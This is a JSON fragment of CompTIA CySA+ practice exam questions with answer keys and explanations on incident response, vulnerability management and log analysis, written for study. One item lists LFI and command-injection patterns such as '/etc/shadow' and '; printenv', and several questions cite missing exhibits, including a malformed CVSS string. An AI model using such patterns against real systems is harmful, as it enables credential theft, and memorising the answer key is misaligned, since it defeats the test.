    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A virtual web server in a server pool was infected with malware after an analyst used the internet to\nresearch a system issue. After the server was rebuilt and added back into the server pool, users\nreported issues with the website, indicating the site could not be trusted. Which of the following is\nthe most likely cause of the server issue?",
    "options": [
      "A. The server was configured to use SSI- to securely transmit data",
      "B. The server was supporting weak TLS protocols for client connections.",
      "C. The malware infected all the web servers in the pool.",
      "D. The digital certificate on the web server was self-signed"
    ],
    "answer": "D",
    "explanation": "A digital certificate is a document that contains the public key and identity information of a web\nserver, and is signed by a trusted third-party authority called a certificate authority (CA). A digital\ncertificate allows the web server to establish a secure connection with the clients using the HTTPS\nprotocol, and also verifies the authenticity of the web server. A self-signed certificate is a digital\ncertificate that is not signed by a CA, but by the web server itself. A self-signed certificate can cause\nissues with the website, as it may not be trusted by the clients or their browsers. Clients may receive\nwarnings or errors when trying to access the website, indicating that the site could not be trusted or\nthat the connection is not secure. Official Reference:\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.techtarget.com/searchsecurity/quiz/Sample-CompTIA-CySA-test-questions-with-\nanswers",
    "image": "images/page_66_img_2.jpeg"
  },
  {
    "id": "q-jc-104",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A security analyst is reviewing the following alert that was triggered by FIM on a critical system:\nWhich of the following best describes the suspicious activity that is occurring?",
    "options": [
      "A. A fake antivirus program was installed by the user.",
      "B. A network drive was added to allow exfiltration of data",
      "C. A new program has been set to execute on system start",
      "D. The host firewall on 192.168.1.10 was disabled."
    ],
    "answer": "C",
    "explanation": "A new program has been set to execute on system start is the most likely cause of the suspicious\nactivity that is occurring, as it indicates that the malware has modified the registry keys of the system\nto ensure its persistence. File Integrity Monitoring (FIM) is a tool that monitors changes to files and\nregistry keys on a system and alerts the security analyst of any unauthorized or malicious\nmodifications. The alert triggered by FIM shows that the malware has created a new registry key\nunder the Run subkey, which is used to launch programs automatically when the system starts. The\nnew registry key points to a file named “update.exe” in the Temp folder, which is likely a malicious\nexecutable disguised as a legitimate update file. Official Reference:\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/training/books/cysa-cs0-002-study-guide",
    "image": "images/page_66_img_2.jpeg"
  },
  {
    "id": "q-jc-105",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst is trying to detect connections to a suspicious IP address by collecting the packet\ncaptures from the gateway. Which of the following commands should the security analyst consider\nrunning?",
    "options": [
      "A. grep [IP address] packets.pcap",
      "B. cat packets.pcap | grep [IP Address]",
      "C. tcpdump -n -r packets.pcap host [IP address]",
      "D. strings packets.pcap | grep [IP Address]"
    ],
    "answer": "C",
    "explanation": "tcpdump is a command-line tool that can capture and analyze network packets from a given interface\nor file. The -n option prevents tcpdump from resolving hostnames, which can speed up the analysis.\nThe -r option reads packets from a file, in this case packets.pcap. The host [IP address] filter specifies\nthat tcpdump should only display packets that have the given IP address as either the source or the\ndestination. This command can help the security analyst detect connections to a suspicious IP\naddress by collecting the packet captures from the gateway. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.techtarget.com/searchsecurity/quiz/Sample-CompTIA-CySA-test-questions-with-\nanswers\nhttps://www.reddit.com/r/CompTIA/comments/tmxx84/passed_cysa_heres_my_experience_and_h\now_i_studied/",
    "image": null
  },
  {
    "id": "q-jc-106",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Given the following CVSS string-\nCVSS:3.0/AV:N/AC:L/PR:N/UI:N/3:U/C:K/I:K/A:H\nWhich of the following attributes correctly describes this vulnerability?",
    "options": [
      "A. A user is required to exploit this vulnerability.",
      "B. The vulnerability is network based.",
      "C. The vulnerability does not affect confidentiality.",
      "D. The complexity to exploit the vulnerability is high."
    ],
    "answer": "B",
    "explanation": "The vulnerability is network based is the correct attribute that describes this vulnerability, as it can\nbe inferred from the CVSS string. CVSS stands for Common Vulnerability Scoring System, which is a\nframework that assigns numerical scores and ratings to vulnerabilities based on their characteristics\nand severity. The CVSS string consists of several metrics that define different aspects of the\nvulnerability, such as the attack vector, the attack complexity, the privileges required, the user\ninteraction, the scope, and the impact on confidentiality, integrity and availability. The first metric in\nthe CVSS string is the attack vector (AV), which indicates how the vulnerability can be exploited. The\nvalue of AV in this case is N, which stands for network. This means that the vulnerability can be\nexploited remotely over a network connection, without physical or logical access to the target\nsystem. Therefore, the vulnerability is network based. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://packitforwarding.com/index.php/2019/01/10/comptia-cysa-common-vulnerability-scoring-\nsystem-cvss/",
    "image": null
  },
  {
    "id": "q-jc-107",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An incident response team is working with law enforcement to investigate an active web server\ncompromise. The decision has been made to keep the server running and to implement\ncompensating controls for a period of time. The web service must be accessible from the internet via\nthe reverse proxy and must connect to a database server. Which of the following compensating\ncontrols will help contain the adversary while meeting the other requirements? (Select two).",
    "options": [
      "A. Drop the tables on the database server to prevent data exfiltration.",
      "B. Deploy EDR on the web server and the database server to reduce the adversaries capabilities.",
      "C. Stop the httpd service on the web server so that the adversary can not use web exploits",
      "D. use micro segmentation to restrict connectivity to/from the web and database servers.",
      "E. Comment out the HTTP account in the / etc/passwd file of the web server",
      "F. Move the database from the database server to the web server."
    ],
    "answer": [
      "B",
      "D"
    ],
    "explanation": "B. Deploy EDR on the web server and database server to monitor and restrict adversary actions in real time, and D. Use micro-segmentation to restrict connectivity to/from the compromised web server are the correct choices. Because law enforcement is involved, the server must remain online to preserve evidence (forensic hold). EDR provides visibility into attacker actions without shutting down. Micro-segmentation limits lateral movement to the database while maintaining evidence integrity. Dropping database tables (A) destroys evidence. Stopping httpd (C) alerts the attacker. Commenting out accounts (E) and moving the database (F) are disruptive and not evidence-preserving.",
    "image": null
  },
  {
    "id": "q-jc-108",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A recent penetration test discovered that several employees were enticed to assist attackers by\nvisiting specific websites and running downloaded files when prompted by phone calls. Which of the\nfollowing would best address this issue?",
    "options": [
      "A. Increasing training and awareness for all staff",
      "B. Ensuring that malicious websites cannot be visited",
      "C. Blocking all scripts downloaded from the internet",
      "D. Disabling all staff members' ability to run downloaded applications"
    ],
    "answer": "A",
    "explanation": "Increasing training and awareness for all staff is the best way to address the issue of employees being\nenticed to assist attackers by visiting specific websites and running downloaded files when prompted\nby phone calls. This issue is an example of social engineering, which is a technique that exploits\nhuman psychology and behavior to manipulate people into performing actions or divulging\ninformation that benefit the attackers. Social engineering can take many forms, such as phishing,\nvishing, baiting, quid pro quo, or impersonation. The best defense against social engineering is to\neducate and train the staff on how to recognize and avoid common social engineering tactics, such\nas:\nVerifying the identity and legitimacy of the caller or sender before following their instructions or\nclicking on any links or attachments\nBeing wary of unsolicited or unexpected requests for information or action, especially if they involve\nurgency, pressure, or threats\nReporting any suspicious or anomalous activity to the security team or the appropriate authority\nFollowing the organization’s policies and procedures on security awareness and best practices\nOfficial Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": null
  },
  {
    "id": "q-jc-109",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "Which of the following describes a contract that is used to define the various levels of maintenance\nto be provided by an external business vendor in a secure environment?",
    "options": [
      "A. MOU",
      "B. NDA",
      "C. BIA",
      "D. SLA"
    ],
    "answer": "D",
    "explanation": "SLA stands for Service Level Agreement, which is a contract that defines the various levels of\nmaintenance to be provided by an external business vendor in a secure environment. An SLA\nspecifies the expectations, responsibilities, and obligations of both parties, such as the scope, quality,\navailability, and performance of the service, as well as the metrics and methods for measuring and\nreporting the service level. An SLA also outlines the penalties or remedies for any breach or failure of\nthe service level. An SLA can help ensure that the external business vendor delivers the service in a\ntimely, consistent, and secure manner, and that the customer receives the service that meets their\nneeds and requirements. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": "images/page_71_img_2.jpeg"
  },
  {
    "id": "q-jc-110",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following risk management principles is accomplished by purchasing cyber insurance?",
    "options": [
      "A. Accept",
      "B. Avoid",
      "C. Mitigate",
      "D. Transfer"
    ],
    "answer": "D",
    "explanation": "Transfer is the risk management principle that is accomplished by purchasing cyber insurance.\nTransfer is a strategy that involves shifting the risk or its consequences to another party, such as an\ninsurance company, a vendor, or a partner. Transfer does not eliminate the risk, but it reduces the\npotential impact or liability of the risk for the original party. Cyber insurance is a type of insurance\nthat covers the losses and damages resulting from cyberattacks, such as data breaches, ransomware,\ndenial-of-service attacks, or network disruptions. Cyber insurance can help transfer the risk of cyber\nincidents by providing financial compensation, legal assistance, or recovery services to the insured\nparty. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": "images/page_71_img_2.jpeg"
  },
  {
    "id": "q-jc-111",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The vulnerability analyst reviews threat intelligence regarding emerging vulnerabilities affecting\nworkstations that are used within the company:\nWhich of the following vulnerabilities should the analyst be most concerned about, knowing that end\nusers frequently click on malicious links sent via email?",
    "options": [
      "A. Vulnerability A",
      "B. Vulnerability B",
      "C. Vulnerability C",
      "D. Vulnerability D"
    ],
    "answer": "B",
    "explanation": "Vulnerability B is the vulnerability that the analyst should be most concerned about, knowing that\nend users frequently click on malicious links sent via email. Vulnerability B is a remote code\nexecution vulnerability in Microsoft Outlook that allows an attacker to run arbitrary code on the\ntarget system by sending a specially crafted email message. This vulnerability is very dangerous, as it\ndoes not require any user interaction or attachment opening to trigger the exploit. The attacker only\nneeds to send an email to the victim’s Outlook account, and the code will execute automatically\nwhen Outlook connects to the Exchange server. This vulnerability has a high severity rating of 9.8 out\nof 10, and it affects all supported versions of Outlook. Therefore, the analyst should prioritize\npatching this vulnerability as soon as possible to prevent potential compromise of the workstations.",
    "image": "images/page_71_img_2.jpeg"
  },
  {
    "id": "q-jc-112",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "While reviewing web server logs, an analyst notices several entries with the same time stamps, but\nall contain odd characters in the request line. Which of the following steps should be taken next?",
    "options": [
      "A. Shut the network down immediately and call the next person in the chain of command.",
      "B. Determine what attack the odd characters are indicative of",
      "C. Utilize the correct attack framework and determine what the incident response will consist of.",
      "D. Notify the local law enforcement for incident response"
    ],
    "answer": "B",
    "explanation": "Determining what attack the odd characters are indicative of is the next step that should be taken\nafter reviewing web server logs and noticing several entries with the same time stamps, but all\ncontain odd characters in the request line. This step can help the analyst identify the type and\nseverity of the attack, as well as the possible source and motive of the attacker. The odd characters in\nthe request line may indicate that the attacker is trying to exploit a vulnerability or inject malicious\ncode into the web server or application, such as SQL injection, cross-site scripting, buffer overflow, or\ncommand injection. The analyst can use tools and techniques such as log analysis, pattern matching,\nsignature detection, or threat intelligence to determine what attack the odd characters are indicative\nof, and then proceed to the next steps of incident response, such as containment, eradication,\nrecovery, and lessons learned. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": null
  },
  {
    "id": "q-jc-113",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst discovers an LFI vulnerability that can be exploited to extract credentials from the\nunderlying host. Which of the following patterns can the security analyst use to search the web\nserver\nlogs for evidence of exploitation of that particular vulnerability?",
    "options": [
      "A. /etc/ shadow",
      "B. curl localhost",
      "C. ; printenv",
      "D. cat /proc/self/"
    ],
    "answer": "A",
    "explanation": "/etc/shadow is the pattern that the security analyst can use to search the web server logs for\nevidence of exploitation of the LFI vulnerability that can be exploited to extract credentials from the\nunderlying host. LFI stands for Local File Inclusion, which is a vulnerability that allows an attacker to\ninclude local files on the web server into the output of a web application. LFI can be exploited to\nextract sensitive information from the web server, such as configuration files, passwords, or source\ncode. The /etc/shadow file is a file that stores the encrypted passwords of all users on a Linux system.\nIf an attacker can exploit the LFI vulnerability to include this file into the web application output, they\ncan obtain the credentials of the users on the web server. Therefore, the security analyst can look for\n/etc/shadow in the request line of the web server logs to see if any attacker has attempted or\nsucceeded in exploiting the LFI vulnerability. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": null
  },
  {
    "id": "q-jc-114",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst at a company called ACME Commercial notices there is outbound traffic to a host\nIP that resolves to https://offce365password.acme.co. The site's standard VPN logon page is\nwww.acme.com/logon. Which of the following is most likely true?",
    "options": [
      "A. This is a normal password change URL.",
      "B. The security operations center is performing a routine password audit.",
      "C. A new VPN gateway has been deployed",
      "D. A social engineering attack is underway"
    ],
    "answer": "D",
    "explanation": "A social engineering attack is underway is the most likely explanation for the outbound traffic to a\nhost IP that resolves to https://offce365password.acme.co, while the site’s standard VPN logon page\nis www.acme.com/logon. A social engineering attack is a technique that exploits human psychology\nand behavior to manipulate people into performing actions or divulging information that benefit the\nattackers. A common type of social engineering attack is phishing, which involves sending fraudulent\nemails or other messages that appear to come from a legitimate source, such as a company or a\ncolleague, and lure the recipients into clicking on malicious links or attachments, or entering their\ncredentials or other sensitive information on fake websites. In this case, the attackers may have\nregistered a domain name that looks similar to the company’s domain name, but with a typo\n(offce365 instead of office365), and set up a fake website that mimics the company’s VPN logon\npage. The attackers may have also sent phishing emails to the company’s employees, asking them to\nreset their passwords or log in to their VPN accounts using the malicious link. The security analyst\nshould investigate the source and content of the phishing emails, and alert the employees not to\nclick on any suspicious links or enter their credentials on any untrusted websites. Official Reference:\nhttps://partners.comptia.org/docs/default-source/resources/comptia-cysa-cs0-002-exam-objectives\nhttps://www.comptia.org/certifications/cybersecurity-analyst\nhttps://www.comptia.org/blog/the-new-comptia-cybersecurity-analyst-your-questions-answered",
    "image": null
  },
  {
    "id": "q-jc-115",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "The security analyst received the monthly vulnerability report. The following findings were included\nin the report\n• Five of the systems only required a reboot to finalize the patch application.\n• Two of the servers are running outdated operating systems and cannot be patched\nThe analyst determines that the only way to ensure these servers cannot be compromised is to\nisolate them. Which of the following approaches will best minimize the risk of the outdated servers\nbeing compromised?",
    "options": [
      "A. Compensating controls",
      "B. Due diligence",
      "C. Maintenance windows",
      "D. Passive discovery"
    ],
    "answer": "A",
    "explanation": "Compensating controls are the best approach to minimize the risk of the outdated servers being\ncompromised, as they can provide an alternative or additional layer of security when the primary\ncontrol is not feasible or effective. Compensating controls are security measures that are\nimplemented to mitigate the risk of a vulnerability or an attack when the primary control is not\nfeasible or effective. For example, if the servers are running outdated operating systems and cannot\nbe patched, a compensating control could be to isolate them from the rest of the network, or to\nimplement a firewall or an intrusion prevention system to monitor and block any malicious traffic to\nor from the servers. Compensating controls can help reduce the likelihood or impact of an exploit,\nbut they do not eliminate the risk completely. Therefore, the security analyst should also consider\nupgrading or replacing the outdated servers as soon as possible.",
    "image": null
  },
  {
    "id": "q-jc-116",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "Which of the following best describes the goal of a tabletop exercise?",
    "options": [
      "A. To test possible incident scenarios and how to react properly",
      "B. To perform attack exercises to check response effectiveness",
      "C. To understand existing threat actors and how to replicate their techniques",
      "D. To check the effectiveness of the business continuity plan"
    ],
    "answer": "A",
    "explanation": "A tabletop exercise is a type of simulation exercise that involves testing possible incident scenarios\nand how to react properly, without actually performing any actions or using any resources. A\ntabletop exercise is usually conducted by a facilitator who presents a realistic scenario to a group of\nparticipants, such as a cyberattack, a natural disaster, or a data breach. The participants then discuss\nand evaluate their roles, responsibilities, plans, procedures, and policies for responding to the\nincident, as well as the potential impacts and outcomes. A tabletop exercise can help identify\nstrengths and weaknesses in the incident response plan, improve communication and coordination\namong the stakeholders, raise awareness and preparedness for potential incidents, and provide\nfeedback and recommendations for improvement.",
    "image": null
  },
  {
    "id": "q-jc-117",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "During the log analysis phase, the following suspicious command is detected-\nWhich of the following is being attempted?",
    "options": [
      "A. Buffer overflow",
      "B. RCE",
      "C. ICMP tunneling",
      "D. Smurf attack"
    ],
    "answer": "B",
    "explanation": "RCE stands for remote code execution, which is a type of attack that allows an attacker to execute\narbitrary commands on a target system. The suspicious command in the question is an example of\nRCE, as it tries to download and execute a malicious file from a remote server using the wget and\nchmod commands. A buffer overflow is a type of vulnerability that occurs when a program writes\nmore data to a memory buffer than it can hold, potentially overwriting other memory locations and\ncorrupting the program’s execution. ICMP tunneling is a technique that uses ICMP packets to\nencapsulate and transmit data that would normally be blocked by firewalls or filters. A smurf attack is\na type of DDoS attack that floods a network with ICMP echo requests, causing all devices on the\nnetwork to reply and generate a large amount of traffic. Verified Reference: What Is Buffer Overflow?\nAttacks, Types & Vulnerabilities - Fortinet1, What Is a Smurf Attack? Smurf DDoS Attack |\nFortinet2, exploit - Interpreting CVE ratings: Buffer Overflow vs. Denial of …3",
    "image": null
  },
  {
    "id": "q-jc-118",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "A cybersecurity team lead is developing metrics to present in the weekly executive briefs. Executives\nare interested in knowing how long it takes to stop the spread of malware that enters the network.\nWhich of the following metrics should the team lead include in the briefs?",
    "options": [
      "A. Mean time between failures",
      "B. Mean time to detect",
      "C. Mean time to remediate",
      "D. Mean time to contain"
    ],
    "answer": "D",
    "explanation": "Mean time to contain is the metric that the cybersecurity team lead should include in the weekly\nexecutive briefs, as it measures how long it takes to stop the spread of malware that enters the\nnetwork. Mean time to contain is the average time it takes to isolate and neutralize an incident or a\nthreat, such as malware, from the time it is detected. Mean time to contain is an important metric\nfor evaluating the effectiveness and efficiency of the incident response process, as well as the\npotential impact and damage of the incident or threat. A lower mean time to contain indicates a\nfaster and more successful response, which can reduce the risk and cost of the incident or threat.\nMean time to contain can also be compared with other metrics, such as mean time to detect or\nmean time to remediate, to identify gaps or areas for improvement in the incident response process.",
    "image": "images/page_77_img_2.jpeg"
  },
  {
    "id": "q-jc-119",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is examining events in multiple systems but is having difficulty correlating data points.\nWhich of the following is most likely the issue with the system?",
    "options": [
      "A. Access rights",
      "B. Network segmentation",
      "C. Time synchronization",
      "D. Invalid playbook"
    ],
    "answer": "C",
    "explanation": "Time synchronization is the process of ensuring that all systems in a network have the same accurate\ntime, which is essential for correlating data points from different sources. If the system has an issue\nwith time synchronization, the analyst may have difficulty matching events that occurred at the same\ntime or in a specific order. Access rights, network segmentation, and invalid playbook are not directly\nrelated to the issue of correlating data points. Verified Reference: [CompTIA CySA+ CS0-002\nCertification Study Guide], page 23",
    "image": "images/page_77_img_2.jpeg"
  },
  {
    "id": "q-jc-125",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An organization was compromised, and the usernames and passwords of all em-ployees were leaked\nonline. Which of the following best describes the remedia-tion that could reduce the impact of this\nsituation?",
    "options": [
      "A. Multifactor authentication",
      "B. Password changes",
      "C. System hardening",
      "D. Password encryption"
    ],
    "answer": "A",
    "explanation": "Multifactor authentication (MFA) is a security method that requires users to provide two or more\npieces of evidence to verify their identity, such as a password, a PIN, a fingerprint, or a one-time\ncode. MFA can reduce the impact of a credential leak because even if the attackers have the\nusernames and passwords of the employees, they would still need another factor to access the\norganization’s systems and resources. Password changes, system hardening, and password\nencryption are also good security practices, but they do not address the immediate threat of\ncompromised credentials.\nReference: CompTIA CySA+ Certification Exam Objectives, [What Is Multifactor Authentication\n(MFA)?]",
    "image": "images/page_97_img_2.jpeg"
  },
  {
    "id": "q-jc-126",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "An organization would like to ensure its cloud infrastructure has a hardened configuration. A\nrequirement is to create a server image that can be deployed with a secure template. Which of the\nfollowing is the best resource to ensure secure configuration?",
    "options": [
      "A. CIS Benchmarks",
      "B. PCI DSS",
      "C. OWASP Top Ten",
      "D. ISO 27001"
    ],
    "answer": "A",
    "explanation": "The best resource to ensure secure configuration of cloud infrastructure is\nA) CIS Benchmarks. CIS Benchmarks are a set of prescriptive configuration recommendations for\nvarious technologies, including cloud providers, operating systems, network devices, and server\nsoftware. They are developed by a global community of cybersecurity experts and help organizations\nprotect their systems against threats more confidently1\nPCI DSS, OWASP Top Ten, and ISO 27001 are also important standards for information security, but\nthey are not focused on providing specific guidance for hardening cloud infrastructure. PCI DSS is a\ncompliance scheme for payment card transactions, OWASP Top Ten is a list of common web\napplication security risks, and ISO 27001 is a framework for establishing and maintaining an\ninformation security management system. These standards may have some relevance for cloud\nsecurity, but they are not as comprehensive and detailed as CIS Benchmarks",
    "image": "images/page_97_img_2.jpeg"
  },
  {
    "id": "q-jc-127",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Security analysts review logs on multiple servers on a daily basis. Which of the following\nimplementations will give the best central visibility into the events occurring throughout the\ncorporate environment without logging in to the servers individually?",
    "options": [
      "A. Deploy a database to aggregate the logging.",
      "B. Configure the servers to forward logs to a SIEM-",
      "C. Share the log directory on each server to allow local access,",
      "D. Automate the emailing of logs to the analysts."
    ],
    "answer": "B",
    "explanation": "The best implementation to give the best central visibility into the events occurring throughout the\ncorporate environment without logging in to the servers individually is B. Configure the servers to\nforward logs to a SIEM.\nA SIEM (Security Information and Event Management) is a security solution that helps organizations\ndetect, analyze, and respond to security threats before they disrupt business1. SIEM tools collect,\naggregate, and correlate log data from various sources across an organization’s network, such as\napplications, devices, servers, and users. SIEM tools also provide real-time alerts, dashboards,\nreports, and incident response capabilities to help security teams identify and mitigate\ncyberattacks2345.\nBy configuring the servers to forward logs to a SIEM, the security analysts can have a central view of\npotential threats and monitor security incidents across the corporate environment without logging in\nto the servers individually. This can save time, improve efficiency, and enhance security posture2345.\nDeploying a database to aggregate the logging (A) may not provide the same level of analysis,\ncorrelation, and alerting as a SIEM tool. Sharing the log directory on each server to allow local access\n© may not be scalable or secure for a large number of servers. Automating the emailing of logs to\nthe analysts (D) may not be timely or effective for real-time threat detection and response.\nTherefore, B is the best option among the choices given.",
    "image": null
  },
  {
    "id": "q-jc-128",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which of the following would help an analyst to quickly find out whether the IP address in a SIEM\nalert is a known-malicious IP address?",
    "options": [
      "A. Join an information sharing and analysis center specific to the company's industry.",
      "B. Upload threat intelligence to the IPS in STIX/TAXII format.",
      "C. Add data enrichment for IPS in the ingestion pipleline.",
      "D. Review threat feeds after viewing the SIEM alert."
    ],
    "answer": "C",
    "explanation": "The best option to quickly find out whether the IP address in a SIEM alert is a known-malicious IP\naddress is C. Add data enrichment for IPS in the ingestion pipeline.\nData enrichment is the process of adding more information and context to raw data, such as IP\naddresses, by using external sources. Data enrichment can help analysts to gain more insights into\nthe nature and origin of the threats they face, and to prioritize and respond to them accordingly.\nData enrichment for IPS (Intrusion Prevention System) means that the IPS can use enriched data to\nblock or alert on malicious traffic based on various criteria, such as geolocation, reputation, threat\nintelligence, or behavior. By adding data enrichment for IPS in the ingestion pipeline, analysts can\nleverage the IPS’s capabilities to filter out known-malicious IP addresses before they reach the SIEM,\nor to tag them with relevant information for further analysis. This can save time and resources for the\nanalysts, and improve the accuracy and efficiency of the SIEM.\nThe other options are not as effective or efficient as data enrichment for IPS in the ingestion pipeline.\nJoining an information sharing and analysis center (ISAC) specific to the company’s industry (A) can\nprovide valuable threat intelligence and best practices, but it may not be timely or comprehensive\nenough to cover all possible malicious IP addresses. Uploading threat intelligence to the IPS in\nSTIX/TAXII format (B) can help the IPS to identify and block malicious IP addresses based on\nstandardized indicators of compromise, but it may require manual or periodic updates and\nintegration with the SIEM. Reviewing threat feeds after viewing the SIEM alert (D) can help analysts\nto verify and contextualize the malicious IP addresses, but it may be too late or too slow to prevent\nor mitigate the damage. Therefore, C is the best option among the choices given.",
    "image": null
  },
  {
    "id": "q-jc-129",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "Which of the following best describes the process of requiring remediation of a known threat within\na given time frame?",
    "options": [
      "A. SLA",
      "B. MOU",
      "C. Best-effort patching",
      "D. Organizational governance"
    ],
    "answer": "A",
    "explanation": "An SLA (Service Level Agreement) is a contract or agreement between a service provider and a\ncustomer that defines the expected level of service, performance, quality, and availability of the\nservice. An SLA also specifies the responsibilities, obligations, and penalties for both parties in case\nof non-compliance or breach of the agreement. An SLA can help organizations to ensure that their\nsecurity services are delivered in a timely and effective manner, and that any security incidents or\nvulnerabilities are addressed and resolved within a specified time frame. An SLA can also help to\nestablish clear communication, expectations, and accountability between the service provider and\nthe customer12\nAn MOU (Memorandum of Understanding) is a document that expresses a mutual agreement or\nunderstanding between two or more parties on a common goal or objective. An MOU is not legally\nbinding, but it can serve as a basis for future cooperation or collaboration. An MOU may not be\nsuitable for requiring remediation of a known threat within a given time frame, as it does not have\nthe same level of enforceability, specificity, or measurability as an SLA.\nBest-effort patching is an informal and ad hoc approach to applying security patches or updates to\nsystems or software. Best-effort patching does not follow any defined process, policy, or schedule,\nand relies on the availability and discretion of the system administrators or users. Best-effort\npatching may not be effective or efficient for requiring remediation of a known threat within a given\ntime frame, as it does not guarantee that the patches are applied correctly, consistently, or promptly.\nBest-effort patching may also introduce new risks or vulnerabilities due to human error, compatibility\nissues, or lack of testing.\nOrganizational governance is the framework of rules, policies, procedures, and processes that guide\nand direct the activities and decisions of an organization. Organizational governance can help to\nestablish the roles, responsibilities, and accountabilities of different stakeholders within the\norganization, as well as the goals, values, and principles that shape the organizational culture and\nbehavior. Organizational governance can also help to ensure compliance with internal and external\nstandards, regulations, and laws. Organizational governance may not be sufficient for requiring\nremediation of a known threat within a given time frame, as it does not specify the details or metrics\nof the service delivery or performance. Organizational governance may also vary depending on the\nsize, structure, and nature of the organization.",
    "image": null
  },
  {
    "id": "q-jc-130",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "A systems administrator notices unfamiliar directory names on a production server. The\nadministrator reviews the directory listings and files, and then concludes the server has been\ncompromised. Which of the following steps should the administrator take next?",
    "options": [
      "A. Inform the internal incident response team.",
      "B. Follow the company's incident response plan.",
      "C. Review the lessons learned for the best approach.",
      "D. Determine when the access started."
    ],
    "answer": "B",
    "explanation": "An incident response plan is a set of predefined procedures and guidelines that an organization\nfollows when faced with a security breach or attack. An incident response plan helps to ensure that\nthe organization can quickly and effectively contain, analyze, eradicate, and recover from the\nincident, as well as prevent or minimize the damage and impact to the business operations,\nreputation, and customers. An incident response plan also defines the roles and responsibilities of\nthe incident response team, the communication channels and protocols, the escalation and reporting\nprocedures, and the tools and resources available for the incident response.\nBy following the company’s incident response plan, the administrator can ensure that they are\nfollowing the best practices and standards for handling a security incident, and that they are\ncoordinating and collaborating with the relevant stakeholders and authorities. Following the\ncompany’s incident response plan can also help to avoid or reduce any legal, regulatory, or\ncontractual liabilities or penalties that may arise from the incident.\nThe other options are not as effective or appropriate as following the company’s incident response\nplan. Informing the internal incident response team (A) is a good step, but it should be done\naccording to the company’s incident response plan, which may specify who, when, how, and what to\nreport. Reviewing the lessons learned for the best approach © is a good step, but it should be done\nafter the incident has been resolved and closed, not during the active response phase. Determining\nwhen the access started (D) is a good step, but it should be done as part of the analysis phase of the\nincident response plan, not before following the plan.",
    "image": null
  },
  {
    "id": "q-jc-131",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
